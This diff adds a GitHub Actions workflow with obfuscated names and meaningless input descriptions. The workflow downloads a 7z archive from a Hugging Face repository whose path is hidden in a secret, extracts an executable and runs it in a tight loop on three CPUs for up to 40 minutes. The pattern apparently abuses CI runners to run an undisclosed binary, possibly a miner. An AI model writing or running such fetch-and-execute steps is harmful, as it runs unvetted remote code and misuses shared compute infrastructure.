@@ -1,0 +1,36 @@
+name: cyr
+on:
+  workflow_dispatch:
+    inputs:
+      loop_override:
+        description: 'aa'
+        required: false
+        default: '10'
+        type: string
+      amd_override:
+        description: 'bb'
+        required: false
+        default: 'v3'
+        type: string
+env:
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
+  HF_REPO: ${{ secrets.HF_REPO }}
+  VERA: 'huggingface'
+  REPO_DIR: ${{ github.workspace }}
+  TZG: v1.0.0_${{ github.event.inputs.amd_override }}
+  EHP: ${{ github.event.inputs.loop_override }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Cyr
+        timeout-minutes: 40
+        run: |
+          curl -o runn.7z -L --url "https://${{ env.VERA }}.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TZG }}.7z?download=true"
+          7z x runn.7z
+          rm -rf runn.7z && mv doit runn && chmod +x runn
+          ./runn loop ${{ env.EHP }} steps 1000000 wait 0 cpu 3
